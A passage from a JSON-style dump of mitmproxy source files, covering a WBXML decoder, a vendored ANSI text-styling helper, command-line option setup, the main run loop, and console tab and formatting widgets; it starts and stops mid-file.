0\n\n\t\t\t\ttoken = currentByte & 0x3F\n\t\t\t\tif (hasAttributes):\n\t\t\t\t\traise InvalidDataException(\"Token 0x{0:X} has attributes.\".format(token))\n\n\t\t\t\tstrTag = self.codePages[self.currentCodePage].getTag(token)\n\t\t\t\tif (strTag == None):\n\t\t\t\t\tstrTag = \"UNKNOWN_TAG_{0,2:X}\".format(token)\n\n\t\t\t\tnewNode = self.xmlDoc.createElement(strTag)\n\t\t\t\t# not sure if this should be set on every node or not\n\t\t\t\t#newNode.setAttribute(\"xmlns\", self.codePages[self.currentCodePage].xmlns)\n\t\t\t\t\n\t\t\t\tcurrentNode.appendChild(newNode)\n\n\t\t\t\tif (hasContent):\n\t\t\t\t\tcurrentNode = newNode\n\n\t\tlogging.debug(\"Total bytes dequeued: %d\" % wbXMLBytes.bytesDequeued)\n", "mitmproxy/contrib/wbxml/GlobalTokens.py": "#!/usr/bin/env python3\n'''\n@author: David Shaw, shawd@vmware.com\n\nInspired by EAS Inspector for Fiddler\nhttps://easinspectorforfiddler.codeplex.com\n\n----- The MIT License (MIT) ----- \nFilename: GlobalTokens.py\nCopyright (c) 2014, David P. Shaw\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n'''\nclass GlobalTokens:\n    SWITCH_PAGE = 0x00\n    END = 0x01\n    ENTITY = 0x02\n    STR_I = 0x03\n    LITERAL = 0x04\n    EXT_I_0 = 0x40\n    EXT_I_1 = 0x41\n    EXT_I_2 = 0x42\n    PI = 0x43\n    LITERAL_C = 0x44\n    EXT_T_0 = 0x80\n    EXT_T_1 = 0x81\n    EXT_T_2 = 0x82\n    STR_T = 0x83\n    LITERAL_A = 0x84\n    EXT_0 = 0xC0\n    EXT_1 = 0xC1\n    EXT_2 = 0xC2\n    OPAQUE = 0xC3\n    LITERAL_AC = 0xC4\n", "mitmproxy/contrib/wbxml/__init__.py": "", "mitmproxy/contrib/wbxml/ASWBXMLByteQueue.py": "#!/usr/bin/env python3\n'''\n@author: David Shaw, shawd@vmware.com\n\nInspired by EAS Inspector for Fiddler\nhttps://easinspectorforfiddler.codeplex.com\n\n----- The MIT License (MIT) -----\nFilename: ASWBXMLByteQueue.py\nCopyright (c) 2014, David P. Shaw\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n'''\nfrom queue import Queue\nimport logging\n\nclass ASWBXMLByteQueue(Queue):\n\n    def __init__(self, wbxmlBytes):\n\n        self.bytesDequeued = 0\n        self.bytesEnqueued = 0\n\n        Queue.__init__(self)\n\n        for byte in wbxmlBytes:\n            self.put(byte)\n            self.bytesEnqueued += 1\n\n\n        logging.debug(\"Array byte count: %d, enqueued: %d\" % (self.qsize(), self.bytesEnqueued))\n\n    \"\"\"\n    Created to debug the dequeueing of bytes\n    \"\"\"\n    def dequeueAndLog(self):\n        singleByte = self.get()\n        self.bytesDequeued += 1\n        logging.debug(\"Dequeued byte 0x{0:X} ({1} total)\".format(singleByte, self.bytesDequeued))\n        return singleByte\n\n    \"\"\"\n    Return true if the continuation bit is set in the byte\n    \"\"\"\n    def checkContinuationBit(self, byteval):\n        continuationBitmask = 0x80\n        return (continuationBitmask & byteval) != 0\n\n    def dequeueMultibyteInt(self):\n        iReturn = 0\n        singleByte = 0xFF\n\n        while True:\n            iReturn <<= 7\n            if (self.qsize() == 0):\n                break\n            else:\n                singleByte = self.dequeueAndLog()\n            iReturn += int(singleByte & 0x7F)\n            if not self.checkContinuationBit(singleByte):\n                return iReturn\n\n    def dequeueString(self, length=None):\n        if ( length != None):\n            currentByte = 0x00\n            strReturn = \"\"\n            for i in range(0, length):\n                # TODO: Improve this handling. We are technically UTF-8, meaning\n                # that characters could be more than one byte long. This will fail if we have\n                # characters outside of the US-ASCII range\n                if ( self.qsize() == 0 ):\n                    break\n                currentByte = self.dequeueAndLog()\n                strReturn += chr(currentByte)\n\n        else:\n            currentByte = 0x00\n            strReturn = \"\"\n            while True:\n                currentByte = self.dequeueAndLog()\n                if (currentByte != 0x00):\n                    strReturn += chr(currentByte)\n                else:\n                    break\n\n        return strReturn\n", "mitmproxy/contrib/wbxml/InvalidDataException.py": "#!/usr/bin/env python3\n'''\n@author: David Shaw, shawd@vmware.com\n\nInspired by EAS Inspector for Fiddler\nhttps://easinspectorforfiddler.codeplex.com\n\n----- The MIT License (MIT) ----- \nFilename: InvalidDataException.py\nCopyright (c) 2014, David P. Shaw\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n'''\nclass InvalidDataException(Exception):\n    pass\n", "mitmproxy/contrib/click/__init__.py": "\"\"\"\nSPDX-License-Identifier: BSD-3-Clause\n\nA vendored copy of click.style() @ 4f7b255\n\"\"\"\nimport typing as t\n\n_ansi_colors = {\n    \"black\": 30,\n    \"red\": 31,\n    \"green\": 32,\n    \"yellow\": 33,\n    \"blue\": 34,\n    \"magenta\": 35,\n    \"cyan\": 36,\n    \"white\": 37,\n    \"reset\": 39,\n    \"bright_black\": 90,\n    \"bright_red\": 91,\n    \"bright_green\": 92,\n    \"bright_yellow\": 93,\n    \"bright_blue\": 94,\n    \"bright_magenta\": 95,\n    \"bright_cyan\": 96,\n    \"bright_white\": 97,\n}\n_ansi_reset_all = \"\\033[0m\"\n\n\ndef _interpret_color(\n    color: t.Union[int, t.Tuple[int, int, int], str], offset: int = 0\n) -> str:\n    if isinstance(color, int):\n        return f\"{38 + offset};5;{color:d}\"\n\n    if isinstance(color, (tuple, list)):\n        r, g, b = color\n        return f\"{38 + offset};2;{r:d};{g:d};{b:d}\"\n\n    return str(_ansi_colors[color] + offset)\n\n\ndef style(\n    text: t.Any,\n    fg: t.Optional[t.Union[int, t.Tuple[int, int, int], str]] = None,\n    bg: t.Optional[t.Union[int, t.Tuple[int, int, int], str]] = None,\n    bold: t.Optional[bool] = None,\n    dim: t.Optional[bool] = None,\n    underline: t.Optional[bool] = None,\n    overline: t.Optional[bool] = None,\n    italic: t.Optional[bool] = None,\n    blink: t.Optional[bool] = None,\n    reverse: t.Optional[bool] = None,\n    strikethrough: t.Optional[bool] = None,\n    reset: bool = True,\n) -> str:\n    \"\"\"Styles a text with ANSI styles and returns the new string.  By\n    default the styling is self contained which means that at the end\n    of the string a reset code is issued.  This can be prevented by\n    passing ``reset=False``.\n    Examples::\n        click.echo(click.style('Hello World!', fg='green'))\n        click.echo(click.style('ATTENTION!', blink=True))\n        click.echo(click.style('Some things', reverse=True, fg='cyan'))\n        click.echo(click.style('More colors', fg=(255, 12, 128), bg=117))\n    Supported color names:\n    * ``black`` (might be a gray)\n    * ``red``\n    * ``green``\n    * ``yellow`` (might be an orange)\n    * ``blue``\n    * ``magenta``\n    * ``cyan``\n    * ``white`` (might be light gray)\n    * ``bright_black``\n    * ``bright_red``\n    * ``bright_green``\n    * ``bright_yellow``\n    * ``bright_blue``\n    * ``bright_magenta``\n    * ``bright_cyan``\n    * ``bright_white``\n    * ``reset`` (reset the color code only)\n    If the terminal supports it, color may also be specified as:\n    -   An integer in the interval [0, 255]. The terminal must support\n        8-bit/256-color mode.\n    -   An RGB tuple of three integers in [0, 255]. The terminal must\n        support 24-bit/true-color mode.\n    See https://en.wikipedia.org/wiki/ANSI_color and\n    https://gist.github.com/XVilka/8346728 for more information.\n    :param text: the string to style with ansi codes.\n    :param fg: if provided this will become the foreground color.\n    :param bg: if provided this will become the background color.\n    :param bold: if provided this will enable or disable bold mode.\n    :param dim: if provided this will enable or disable dim mode.  This is\n                badly supported.\n    :param underline: if provided this will enable or disable underline.\n    :param overline: if provided this will enable or disable overline.\n    :param italic: if provided this will enable or disable italic.\n    :param blink: if provided this will enable or disable blinking.\n    :param reverse: if provided this will enable or disable inverse\n                    rendering (foreground becomes background and the\n                    other way round).\n    :param strikethrough: if provided this will enable or disable\n        striking through text.\n    :param reset: by default a reset-all code is added at the end of the\n                  string which means that styles do not carry over.  This\n                  can be disabled to compose styles.\n    .. versionchanged:: 8.0\n        A non-string ``message`` is converted to a string.\n    .. versionchanged:: 8.0\n       Added support for 256 and RGB color codes.\n    .. versionchanged:: 8.0\n        Added the ``strikethrough``, ``italic``, and ``overline``\n        parameters.\n    .. versionchanged:: 7.0\n        Added support for bright colors.\n    .. versionadded:: 2.0\n    \"\"\"\n    if not isinstance(text, str):\n        text = str(text)\n\n    bits = []\n\n    if fg:\n        try:\n            bits.append(f\"\\033[{_interpret_color(fg)}m\")\n        except KeyError:\n            raise TypeError(f\"Unknown color {fg!r}\") from None\n\n    if bg:\n        try:\n            bits.append(f\"\\033[{_interpret_color(bg, 10)}m\")\n        except KeyError:\n            raise TypeError(f\"Unknown color {bg!r}\") from None\n\n    if bold is not None:\n        bits.append(f\"\\033[{1 if bold else 22}m\")\n    if dim is not None:\n        bits.append(f\"\\033[{2 if dim else 22}m\")\n    if underline is not None:\n        bits.append(f\"\\033[{4 if underline else 24}m\")\n    if overline is not None:\n        bits.append(f\"\\033[{53 if overline else 55}m\")\n    if italic is not None:\n        bits.append(f\"\\033[{3 if italic else 23}m\")\n    if blink is not None:\n        bits.append(f\"\\033[{5 if blink else 25}m\")\n    if reverse is not None:\n        bits.append(f\"\\033[{7 if reverse else 27}m\")\n    if strikethrough is not None:\n        bits.append(f\"\\033[{9 if strikethrough else 29}m\")\n    bits.append(text)\n    if reset:\n        bits.append(_ansi_reset_all)\n    return \"\".join(bits)\n\n\n__all__ = [\"style\"]\n", "mitmproxy/tools/cmdline.py": "import argparse\n\n\ndef common_options(parser, opts):\n    parser.add_argument(\n        \"--version\",\n        action=\"store_true\",\n        help=\"show version number and exit\",\n        dest=\"version\",\n    )\n    parser.add_argument(\n        \"--options\",\n        action=\"store_true\",\n        help=\"Show all options and their default values\",\n    )\n    parser.add_argument(\n        \"--commands\",\n        action=\"store_true\",\n        help=\"Show all commands and their signatures\",\n    )\n    parser.add_argument(\n        \"--set\",\n        type=str,\n        dest=\"setoptions\",\n        default=[],\n        action=\"append\",\n        metavar=\"option[=value]\",\n        help=\"\"\"\n            Set an option. When the value is omitted, booleans are set to true,\n            strings and integers are set to None (if permitted), and sequences\n            are emptied. Boolean values can be true, false or toggle.\n            Sequences are set using multiple invocations to set for\n            the same option.\n        \"\"\",\n    )\n    parser.add_argument(\n        \"-q\", \"--quiet\", action=\"store_true\", dest=\"quiet\", help=\"Quiet.\"\n    )\n    parser.add_argument(\n        \"-v\",\n        \"--verbose\",\n        action=\"store_const\",\n        dest=\"verbose\",\n        const=\"debug\",\n        help=\"Increase log verbosity.\",\n    )\n\n    # Basic options\n    opts.make_parser(parser, \"mode\", short=\"m\")\n    opts.make_parser(parser, \"anticache\")\n    opts.make_parser(parser, \"showhost\")\n    opts.make_parser(parser, \"rfile\", metavar=\"PATH\", short=\"r\")\n    opts.make_parser(parser, \"scripts\", metavar=\"SCRIPT\", short=\"s\")\n    opts.make_parser(parser, \"stickycookie\", metavar=\"FILTER\")\n    opts.make_parser(parser, \"stickyauth\", metavar=\"FILTER\")\n    opts.make_parser(parser, \"save_stream_file\", metavar=\"PATH\", short=\"w\")\n    opts.make_parser(parser, \"anticomp\")\n\n    # Proxy options\n    group = parser.add_argument_group(\"Proxy Options\")\n    opts.make_parser(group, \"listen_host\", metavar=\"HOST\")\n    opts.make_parser(group, \"listen_port\", metavar=\"PORT\", short=\"p\")\n    opts.make_parser(group, \"server\", short=\"n\")\n    opts.make_parser(group, \"ignore_hosts\", metavar=\"HOST\")\n    opts.make_parser(group, \"allow_hosts\", metavar=\"HOST\")\n    opts.make_parser(group, \"tcp_hosts\", metavar=\"HOST\")\n    opts.make_parser(group, \"upstream_auth\", metavar=\"USER:PASS\")\n    opts.make_parser(group, \"proxyauth\", metavar=\"SPEC\")\n    opts.make_parser(group, \"rawtcp\")\n    opts.make_parser(group, \"http2\")\n\n    # Proxy SSL options\n    group = parser.add_argument_group(\"SSL\")\n    opts.make_parser(group, \"certs\", metavar=\"SPEC\")\n    opts.make_parser(group, \"cert_passphrase\", metavar=\"PASS\")\n    opts.make_parser(group, \"ssl_insecure\", short=\"k\")\n\n    # Client replay\n    group = parser.add_argument_group(\"Client Replay\")\n    opts.make_parser(group, \"client_replay\", metavar=\"PATH\", short=\"C\")\n\n    # Server replay\n    group = parser.add_argument_group(\"Server Replay\")\n    opts.make_parser(group, \"server_replay\", metavar=\"PATH\", short=\"S\")\n    opts.make_parser(group, \"server_replay_kill_extra\")\n    opts.make_parser(group, \"server_replay_extra\")\n    opts.make_parser(group, \"server_replay_reuse\")\n    opts.make_parser(group, \"server_replay_refresh\")\n\n    # Map Remote\n    group = parser.add_argument_group(\"Map Remote\")\n    opts.make_parser(group, \"map_remote\", metavar=\"PATTERN\", short=\"M\")\n\n    # Map Local\n    group = parser.add_argument_group(\"Map Local\")\n    opts.make_parser(group, \"map_local\", metavar=\"PATTERN\")\n\n    # Modify Body\n    group = parser.add_argument_group(\"Modify Body\")\n    opts.make_parser(group, \"modify_body\", metavar=\"PATTERN\", short=\"B\")\n\n    # Modify headers\n    group = parser.add_argument_group(\"Modify Headers\")\n    opts.make_parser(group, \"modify_headers\", metavar=\"PATTERN\", short=\"H\")\n\n\ndef mitmproxy(opts):\n    parser = argparse.ArgumentParser(usage=\"%(prog)s [options]\")\n    common_options(parser, opts)\n\n    opts.make_parser(parser, \"console_layout\")\n    opts.make_parser(parser, \"console_layout_headers\")\n    group = parser.add_argument_group(\n        \"Filters\", \"See help in mitmproxy for filter expression syntax.\"\n    )\n    opts.make_parser(group, \"intercept\", metavar=\"FILTER\")\n    opts.make_parser(group, \"view_filter\", metavar=\"FILTER\")\n    return parser\n\n\ndef mitmdump(opts):\n    parser = argparse.ArgumentParser(usage=\"%(prog)s [options] [filter]\")\n\n    common_options(parser, opts)\n    opts.make_parser(parser, \"flow_detail\", metavar=\"LEVEL\")\n    parser.add_argument(\n        \"filter_args\",\n        nargs=\"...\",\n        help=\"\"\"\n            Filter expression, equivalent to setting both the view_filter\n            and save_stream_filter options.\n        \"\"\",\n    )\n    return parser\n\n\ndef mitmweb(opts):\n    parser = argparse.ArgumentParser(usage=\"%(prog)s [options]\")\n\n    group = parser.add_argument_group(\"Mitmweb\")\n    opts.make_parser(group, \"web_open_browser\")\n    opts.make_parser(group, \"web_port\", metavar=\"PORT\")\n    opts.make_parser(group, \"web_host\", metavar=\"HOST\")\n\n    common_options(parser, opts)\n    group = parser.add_argument_group(\n        \"Filters\", \"See help in mitmproxy for filter expression syntax.\"\n    )\n    opts.make_parser(group, \"intercept\", metavar=\"FILTER\")\n    return parser\n", "mitmproxy/tools/dump.py": "from mitmproxy import addons\nfrom mitmproxy import master\nfrom mitmproxy import options\nfrom mitmproxy.addons import dumper\nfrom mitmproxy.addons import errorcheck\nfrom mitmproxy.addons import keepserving\nfrom mitmproxy.addons import readfile\n\n\nclass DumpMaster(master.Master):\n    def __init__(\n        self,\n        options: options.Options,\n        loop=None,\n        with_termlog=True,\n        with_dumper=True,\n    ) -> None:\n        super().__init__(options, event_loop=loop, with_termlog=with_termlog)\n        self.addons.add(*addons.default_addons())\n        if with_dumper:\n            self.addons.add(dumper.Dumper())\n        self.addons.add(\n            keepserving.KeepServing(),\n            readfile.ReadFileStdin(),\n            errorcheck.ErrorCheck(),\n        )\n", "mitmproxy/tools/main.py": "from __future__ import annotations\n\nimport argparse\nimport asyncio\nimport logging\nimport os\nimport signal\nimport sys\nfrom collections.abc import Callable\nfrom collections.abc import Sequence\nfrom typing import Any\nfrom typing import TypeVar\n\nfrom mitmproxy import exceptions\nfrom mitmproxy import master\nfrom mitmproxy import options\nfrom mitmproxy import optmanager\nfrom mitmproxy.tools import cmdline\nfrom mitmproxy.utils import arg_check\nfrom mitmproxy.utils import debug\n\n\ndef process_options(parser, opts, args):\n    if args.version:\n        print(debug.dump_system_info())\n        sys.exit(0)\n    if args.quiet or args.options or args.commands:\n        # also reduce log verbosity if --options or --commands is passed,\n        # we don't want log messages from regular startup then.\n        args.termlog_verbosity = \"error\"\n        args.flow_detail = 0\n    if args.verbose:\n        args.termlog_verbosity = \"debug\"\n        args.flow_detail = 2\n\n    adict = {\n        key: val for key, val in vars(args).items() if key in opts and val is not None\n    }\n    opts.update(**adict)\n\n\nT = TypeVar(\"T\", bound=master.Master)\n\n\ndef run(\n    master_cls: type[T],\n    make_parser: Callable[[options.Options], argparse.ArgumentParser],\n    arguments: Sequence[str],\n    extra: Callable[[Any], dict] | None = None,\n) -> T:  # pragma: no cover\n    \"\"\"\n    extra: Extra argument processing callable which returns a dict of\n    options.\n    \"\"\"\n\n    async def main() -> T:\n        logging.getLogger().setLevel(logging.DEBUG)\n        logging.getLogger(\"tornado\").setLevel(logging.WARNING)\n        logging.getLogger(\"asyncio\").setLevel(logging.WARNING)\n        logging.getLogger(\"hpack\").setLevel(logging.WARNING)\n        logging.getLogger(\"quic\").setLevel(\n            logging.WARNING\n        )  # aioquic uses a different prefix...\n        debug.register_info_dumpers()\n\n        opts = options.Options()\n        master = master_cls(opts)\n\n        parser = make_parser(opts)\n\n        # To make migration from 2.x to 3.0 bearable.\n        if \"-R\" in sys.argv and sys.argv[sys.argv.index(\"-R\") + 1].startswith(\"http\"):\n            print(\n                \"To use mitmproxy in reverse mode please use --mode reverse:SPEC instead\"\n            )\n\n        try:\n            args = parser.parse_args(arguments)\n        except SystemExit:\n            arg_check.check()\n            sys.exit(1)\n\n        try:\n            opts.set(*args.setoptions, defer=True)\n            optmanager.load_paths(\n                opts,\n                os.path.join(opts.confdir, \"config.yaml\"),\n                os.path.join(opts.confdir, \"config.yml\"),\n            )\n            process_options(parser, opts, args)\n\n            if args.options:\n                optmanager.dump_defaults(opts, sys.stdout)\n                sys.exit(0)\n            if args.commands:\n                master.commands.dump()\n                sys.exit(0)\n            if extra:\n                if args.filter_args:\n                    logging.info(\n                        f\"Only processing flows that match \\\"{' & '.join(args.filter_args)}\\\"\"\n                    )\n                opts.update(**extra(args))\n\n        except exceptions.OptionsError as e:\n            print(f\"{sys.argv[0]}: {e}\", file=sys.stderr)\n            sys.exit(1)\n\n        loop = asyncio.get_running_loop()\n\n        def _sigint(*_):\n            loop.call_soon_threadsafe(\n                getattr(master, \"prompt_for_exit\", master.shutdown)\n            )\n\n        def _sigterm(*_):\n            loop.call_soon_threadsafe(master.shutdown)\n\n        # We can't use loop.add_signal_handler because that's not available on Windows' Proactorloop,\n        # but signal.signal just works fine for our purposes.\n        signal.signal(signal.SIGINT, _sigint)\n        signal.signal(signal.SIGTERM, _sigterm)\n        # to fix the issue mentioned https://github.com/mitmproxy/mitmproxy/issues/6744\n        # by setting SIGPIPE to SIG_IGN, the process will not terminate and continue to run\n        if hasattr(signal, \"SIGPIPE\"):\n            signal.signal(signal.SIGPIPE, signal.SIG_IGN)\n\n        await master.run()\n        return master\n\n    return asyncio.run(main())\n\n\ndef mitmproxy(args=None) -> int | None:  # pragma: no cover\n    from mitmproxy.tools import console\n\n    run(console.master.ConsoleMaster, cmdline.mitmproxy, args)\n    return None\n\n\ndef mitmdump(args=None) -> int | None:  # pragma: no cover\n    from mitmproxy.tools import dump\n\n    def extra(args):\n        if args.filter_args:\n            v = \" \".join(args.filter_args)\n            return dict(\n                save_stream_filter=v,\n                readfile_filter=v,\n                dumper_filter=v,\n            )\n        return {}\n\n    run(dump.DumpMaster, cmdline.mitmdump, args, extra)\n    return None\n\n\ndef mitmweb(args=None) -> int | None:  # pragma: no cover\n    from mitmproxy.tools import web\n\n    run(web.master.WebMaster, cmdline.mitmweb, args)\n    return None\n", "mitmproxy/tools/__init__.py": "", "mitmproxy/tools/console/tabs.py": "import urwid\n\n\nclass Tab(urwid.WidgetWrap):\n    def __init__(self, offset, content, attr, onclick):\n        \"\"\"\n        onclick is called on click with the tab offset as argument\n        \"\"\"\n        p = urwid.Text(content, align=\"center\")\n        p = urwid.Padding(p, align=\"center\", width=(\"relative\", 100))\n        p = urwid.AttrWrap(p, attr)\n        urwid.WidgetWrap.__init__(self, p)\n        self.offset = offset\n        self.onclick = onclick\n\n    def mouse_event(self, size, event, button, col, row, focus):\n        if event == \"mouse press\" and button == 1:\n            self.onclick(self.offset)\n            return True\n\n\nclass Tabs(urwid.WidgetWrap):\n    def __init__(self, tabs, tab_offset=0):\n        super().__init__(\"\")\n        self.tab_offset = tab_offset\n        self.tabs = tabs\n        self.show()\n        self._w = urwid.Pile([])\n\n    def change_tab(self, offset):\n        self.tab_offset = offset\n        self.show()\n\n    def keypress(self, size, key):\n        n = len(self.tabs)\n        if key == \"m_next\":\n            self.change_tab((self.tab_offset + 1) % n)\n        elif key == \"right\":\n            self.change_tab((self.tab_offset + 1) % n)\n        elif key == \"left\":\n            self.change_tab((self.tab_offset - 1) % n)\n        return self._w.keypress(size, key)\n\n    def show(self):\n        if not self.tabs:\n            return\n\n        headers = []\n        for i in range(len(self.tabs)):\n            txt = self.tabs[i][0]()\n            if i == self.tab_offset % len(self.tabs):\n                headers.append(Tab(i, txt, \"heading\", self.change_tab))\n            else:\n                headers.append(Tab(i, txt, \"heading_inactive\", self.change_tab))\n        headers = urwid.Columns(headers, dividechars=1)\n        self._w = urwid.Frame(\n            body=self.tabs[self.tab_offset % len(self.tabs)][1](), header=headers\n        )\n        self._w.set_focus(\"body\")\n", "mitmproxy/tools/console/common.py": "import enum\nimport math\nimport platform\nfrom collections.abc import Iterable\nfrom functools import lru_cache\n\nimport urwid.util\nfrom publicsuffix2 import get_sld\nfrom publicsuffix2 import get_tld\n\nfrom mitmproxy import dns\nfrom mitmproxy import flow\nfrom mitmproxy.dns import DNSFlow\nfrom mitmproxy.http import HTTPFlow\nfrom mitmproxy.tcp import TCPFlow\nfrom mitmproxy.udp import UDPFlow\nfrom mitmproxy.utils import emoji\nfrom mitmproxy.utils import human\n\n# Detect Windows Subsystem for Linux and Windows\nIS_WINDOWS_OR_WSL = (\n    \"Microsoft\" in platform.platform() or \"Windows\" in platform.platform()\n)\n\n\ndef is_keypress(k):\n    \"\"\"\n    Is this input event a keypress?\n    \"\"\"\n    if isinstance(k, str):\n        return True\n\n\ndef highlight_key(text, key, textattr=\"text\", keyattr=\"key\"):\n    lst = []\n    parts = text.split(key, 1)\n    if parts[0]:\n        lst.append((textattr, parts[0]))\n    lst.append((keyattr, key))\n    if parts[1]:\n        lst.append((textattr, parts[1]))\n    return lst\n\n\nKEY_MAX = 30\n\n\ndef format_keyvals(\n    entries: Iterable[tuple[str, None | str | urwid.Widget]],\n    key_format: str = \"key\",\n    value_format: str = \"text\",\n    indent: int = 0,\n) -> list[urwid.Columns]:\n    \"\"\"\n    Format a list of (key, value) tuples.\n\n    Args:\n        entries: The list to format. keys must be strings, values can also be None or urwid widgets.\n            The latter makes it possible to use the result of format_keyvals() as a value.\n        key_format: The display attribute for the key.\n        value_format: The display attribute for the value.\n        indent: Additional indent to apply.\n    \"\"\"\n    max_key_len = max((len(k) for k, v in entries if k is not None), default=0)\n    max_key_len = min(max_key_len, KEY_MAX)\n\n    if indent > 2:\n        indent -= 2  # We use dividechars=2 below, which already adds two empty spaces\n\n    ret = []\n    for k, v in entries:\n        if v is None:\n            v = urwid.Text(\"\")\n        elif not isinstance(v, urwid.Widget):\n            v = urwid.Text([(value_format, v)])\n        ret.append(\n            urwid.Columns(\n                [\n                    (\"fixed\", indent, urwid.Text(\"\")),\n                    (\"fixed\", max_key_len, urwid.Text([(key_format, k)])),\n                    v,\n                ],\n                dividechars=2,\n            )\n        )\n    return ret\n\n\ndef fcol(s: str, attr: str) -> tuple[str, int, urwid.Text]:\n    s = str(s)\n    return (\"fixed\", len(s), urwid.Text([(attr, s)]))\n\n\nif urwid.util.detected_encoding:\n    SYMBOL_REPLAY = \"\\u21ba\"\n    SYMBOL_RETURN = \"\\u2190\"\n    SYMBOL_MARK = \"\\u25cf\"\n    SYMBOL_UP = \"\\u21e7\"\n    SYMBOL_DOWN = \"\\u21e9\"\n    SYMBOL_ELLIPSIS = \"\\u2026\"\n    SYMBOL_FROM_CLIENT = \"\\u21d2\"\n    SYMBOL_TO_CLIENT = \"\\u21d0\"\nelse:\n    SYMBOL_REPLAY = \"[r]\"\n    SYMBOL_RETURN = \"<-\"\n    SYMBOL_MARK = \"#\"\n    SYMBOL_UP = \"^\"\n    SYMBOL_DOWN = \" \"\n    SYMBOL_ELLIPSIS = \"~\"\n    SYMBOL_FROM_CLIENT = \"->\"\n    SYMBOL_TO_CLIENT = \"<-\"\n\nSCHEME_STYLES = {\n    \"http\": \"scheme_http\",\n    \"https\": \"scheme_https\",\n    \"ws\": \"scheme_ws\",\n    \"wss\": \"scheme_wss\",\n    \"tcp\": \"scheme_tcp\",\n    \"udp\": \"scheme_udp\",\n    \"dns\": \"scheme_dns\",\n    \"quic\": \"scheme_quic\",\n}\nHTTP_REQUEST_METHOD_STYLES = {\n    \"GET\": \"method_get\",\n    \"POST\": \"method_post\",\n    \"DELETE\": \"method_delete\",\n    \"HEAD\": \"method_head\",\n    \"PUT\": \"method_put\",\n}\nHTTP_RESPONSE_CODE_STYLE = {\n    2: \"code_200\",\n    3: \"code_300\",\n    4: \"code_400\",\n    5: \"code_500\",\n}\n\n\nclass RenderMode(enum.Enum):\n    TABLE = 1\n    \"\"\"The flow list in table format, i.e. one row per flow.\"\"\"\n    LIST = 2\n    \"\"\"The flow list in list format, i.e. potentially multiple rows per flow.\"\"\"\n    DETAILVIEW = 3\n    \"\"\"The top lines in the detail view.\"\"\"\n\n\ndef fixlen(s: str, maxlen: int) -> str:\n    if len(s) <= maxlen:\n        return s.ljust(maxlen)\n    else:\n        return s[0 : maxlen - len(SYMBOL_ELLIPSIS)] + SYMBOL_ELLIPSIS\n\n\ndef fixlen_r(s: str, maxlen: int) -> str:\n    if len(s) <= maxlen:\n        return s.rjust(maxlen)\n    else:\n        return SYMBOL_ELLIPSIS + s[len(s) - maxlen + len(SYMBOL_ELLIPSIS) :]\n\n\ndef render_marker(marker: str) -> str:\n    rendered = emoji.emoji.get(marker, SYMBOL_MARK)\n\n    # The marker can only be one glyph. Some emoji that use zero-width joiners (ZWJ)\n    # will not be rendered as a single glyph and instead will show\n    # multiple glyphs. Just use the first glyph as a fallback.\n    # https://emojipedia.org/emoji-zwj-sequence/\n    return rendered[0]\n\n\nclass TruncatedText(urwid.Widget):\n    def __init__(self, text, attr, align=\"left\"):\n        self.text = text\n        self.attr = attr\n        self.align = align\n        super().__init__()\n\n    def pack(self, size, focus=False):\n        return (len(self.text), 1)\n\n    def rows(self, size, focus=False):\n        return 1\n\n    def render(self, size, focus=False):\n        text = self.text\n        attr = self.attr\n        if self.align == \"right\":\n            text = text[::-1]\n            attr = attr[::-1]\n\n        text_len = urwid.util.calc_width(text, 0, len(text))\n        if size is not None and len(size) > 0:\n            width = size[0]\n        else:\n            width = text_len\n\n        if width >= text_len:\n            remaining = width - text_len\n            if remaining > 0:\n                c_text = text + \" \" * remaining\n                c_attr = attr + [(\"text\", remaining)]\n            